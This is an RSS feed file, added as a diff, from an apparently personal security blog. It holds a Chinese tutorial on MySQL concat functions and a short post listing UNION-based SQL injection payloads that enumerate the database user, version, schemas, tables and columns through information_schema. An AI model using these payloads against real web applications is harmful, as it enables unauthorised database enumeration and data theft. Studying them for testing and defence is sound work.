@@ -1,0 +1,311 @@
+<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/css" href="/css/rss.css"?><rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>sql - 标签 - zu1k</title><link>https://zu1k.com/tags/sql/</link><description/><language>zh-CN</language><managingEditor>i@zu1k.com (zu1k)</managingEditor><webMaster>i@zu1k.com (zu1k)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Sun, 22 Mar 2020 18:23:34 +0800</lastBuildDate><atom:link href="https://zu1k.com/tags/sql/" rel="self" type="application/rss+xml"/><item><title>MySQL中几个concat的用法与区别</title><link>https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/</link><pubDate>Sun, 22 Mar 2020 18:23:34 +0800</pubDate><author>zu1k</author><guid>https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/</guid><description><![CDATA[<h2 id="讲解与示例">讲解与示例</h2>
+<h3 id="concatstr1-str2-">CONCAT(str1, str2, &hellip;)</h3>
+<ol>
+<li>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL</li>
+<li>参数可以是字段名或具体值</li>
+</ol>
+<p>注意：</p>
+<ol>
+<li>如果所有参数均为非二进制字符串，则结果为非二进制字符串</li>
+<li>如果自变量中含有任一二进制字符串，则结果为一个二进制字符串</li>
+<li>一个数字参数被转化为与之相等的二进制字符串格式</li>
+<li>若要避免这种情况，可使用显式类型 cast, 例如： <code>SELECT CONCAT(CAST(int_col AS CHAR), char_col)</code></li>
+</ol>
+<h4 id="mysql的concat函数可以连接一个或者多个字符串">MySQL的concat函数可以连接一个或者多个字符串</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span class="s1">&#39;10&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">+--------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> concat<span class="o">(</span><span class="s1">&#39;10&#39;</span><span class="o">)</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">10</span>   <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------+
+</span></span><span class="line"><span class="cl"><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">+------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> concat<span class="o">(</span><span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">112233</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------------------+
+</span></span><span class="line"><span class="cl"><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="mysql的concat函数在连接字符串的时候只要其中一个是null那么将返回null">MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,null<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">+------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> concat<span class="o">(</span><span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,null<span class="o">)</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> NULL   <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------------------+
+</span></span><span class="line"><span class="cl"><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="concat_wsseparatorstr1str2">CONCAT_WS(separator,str1,str2,…)</h3>
+<p>CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。</p>
+<p>注意：</p>
+<ol>
+<li>参数可以是字段名或具体值</li>
+<li>如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。（只保留非空值）</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> concat_ws<span class="o">(</span><span class="s1">&#39;&#39;</span>,<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">+--------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> concat_ws<span class="o">(</span><span class="s1">&#39;&#39;</span>,<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">33</span>                       <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------------+
+</span></span><span class="line"><span class="cl"><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.04 sec<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="如连接后以逗号分隔">如连接后以逗号分隔</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> concat_ws<span class="o">(</span><span class="s1">&#39;,&#39;</span>,<span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">+-------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> concat_ws<span class="o">(</span><span class="s1">&#39;,&#39;</span>,<span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 11,22,33 <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------------------------+
+</span></span><span class="line"><span class="cl"><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="和mysql中concat函数不同的是-concat_ws函数在执行的时候不会因为null值而返回null">和MySQL中concat函数不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> concat_ws<span class="o">(</span><span class="s1">&#39;,&#39;</span>,<span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,NULL<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">+-------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> concat_ws<span class="o">(</span><span class="s1">&#39;,&#39;</span>,<span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,NULL<span class="o">)</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 11,22 <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------------------------+
+</span></span><span class="line"><span class="cl"><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="group_concat-函数">GROUP_CONCAT() 函数</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">group_concat</span><span class="p">([</span><span class="k">DISTINCT</span><span class="p">]</span><span class="w"> </span><span class="err">要连接的字段</span><span class="w"> </span><span class="p">[</span><span class="k">Order</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="k">ASC</span><span class="o">/</span><span class="k">DESC</span><span class="w"> </span><span class="err">排序字段</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">Separator</span><span class="w"> </span><span class="err">‘分隔符’</span><span class="p">])</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="基本查询">基本查询</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> * from aa<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+------+------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> id<span class="p">|</span> name <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------+------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="m">1</span> <span class="p">|</span> 10<span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="m">1</span> <span class="p">|</span> 20<span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="m">1</span> <span class="p">|</span> 20<span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="m">2</span> <span class="p">|</span> 20<span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="m">3</span> <span class="p">|</span> <span class="m">200</span>   <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="m">3</span> <span class="p">|</span> <span class="m">500</span>   <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------+------+
+</span></span><span class="line"><span class="cl"><span class="m">6</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="以id分组把name字段的值打印在一行逗号分隔默认">以id分组，把name字段的值打印在一行，逗号分隔(默认)</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> id,group_concat<span class="o">(</span>name<span class="o">)</span> from aa group by id<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+------+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> id<span class="p">|</span> group_concat<span class="o">(</span>name<span class="o">)</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="m">1</span> <span class="p">|</span> 10,20,20<span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="m">2</span> <span class="p">|</span> <span class="m">20</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="m">3</span> <span class="p">|</span> 200,500<span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------+--------------------+
+</span></span><span class="line"><span class="cl"><span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="以id分组把去冗余的name字段的值打印在一行逗号分隔">以id分组，把去冗余的name字段的值打印在一行，逗号分隔</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> id,group_concat<span class="o">(</span>distinct name<span class="o">)</span> from aa group by id<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+------+-----------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> id<span class="p">|</span> group_concat<span class="o">(</span>distinct name<span class="o">)</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------+-----------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="m">1</span> <span class="p">|</span> 10,20<span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="m">2</span> <span class="p">|</span> <span class="m">20</span>   <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="m">3</span> <span class="p">|</span> 200,500 <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------+-----------------------------+
+</span></span><span class="line"><span class="cl"><span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="以id分组把name字段的值打印在一行逗号分隔以name排倒序">以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> id,group_concat<span class="o">(</span>name order by name desc<span class="o">)</span> from aa group by id<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+------+---------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> id<span class="p">|</span> group_concat<span class="o">(</span>name order by name desc<span class="o">)</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------+---------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="m">1</span> <span class="p">|</span> 20,20,10   <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="m">2</span> <span class="p">|</span> 20<span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="m">3</span> <span class="p">|</span> 500,200<span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------+---------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="区别">区别</h2>
+<p><a href="https://stackoverflow.com/questions/11889391/difference-between-group-concat-and-concat-ws" target="_blank" rel="noopener noreffer">https://stackoverflow.com/questions/11889391/difference-between-group-concat-and-concat-ws</a></p>
+<h3 id="concat_ws">concat_ws</h3>
+<p><a href="http://www.w3resource.com/mysql/string-functions/mysql-concat_ws-function.php" target="_blank" rel="noopener noreffer">http://www.w3resource.com/mysql/string-functions/mysql-concat_ws-function.php</a></p>
+<p></p>
+<h3 id="group_concat">group_concat</h3>
+<p><a href="http://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php" target="_blank" rel="noopener noreffer">http://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php</a></p>
+<p></p>
+]]></description></item><item><title>查询重要数据的sql语句</title><link>https://zu1k.com/posts/security/web-security/sql-to-select-some-base-info/</link><pubDate>Sun, 14 Oct 2018 18:13:10 +0800</pubDate><author>zu1k</author><guid>https://zu1k.com/posts/security/web-security/sql-to-select-some-base-info/</guid><description><![CDATA[<p>查询用户名，数据库名，数据库版本信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="n">concat_ws</span><span class="p">(</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">32</span><span class="p">),</span><span class="k">user</span><span class="p">(),</span><span class="k">database</span><span class="p">(),</span><span class="k">version</span><span class="p">()))</span><span class="w"> </span><span class="o">%</span><span class="mi">23</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>查询所有数据库名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">schema_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>查询一个库中所有的表的名字</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span><span class="k">table_name</span><span class="p">,</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w">   </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="mi">0</span><span class="n">x7365637572697479</span><span class="w">  </span><span class="o">%</span><span class="mi">23</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意。在系统自带的表中查东西，where后面的值应该是单引号包裹或者16进制编码，通常用16进制</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;my_db&#39;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>查询一个表中所有列的名字</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span><span class="k">table_name</span><span class="p">,</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w">   </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="mi">0</span><span class="n">x7365637572697479</span><span class="w">  </span><span class="o">%</span><span class="mi">23</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">column_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;my_db&#39;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div>]]></description></item></channel></rss>
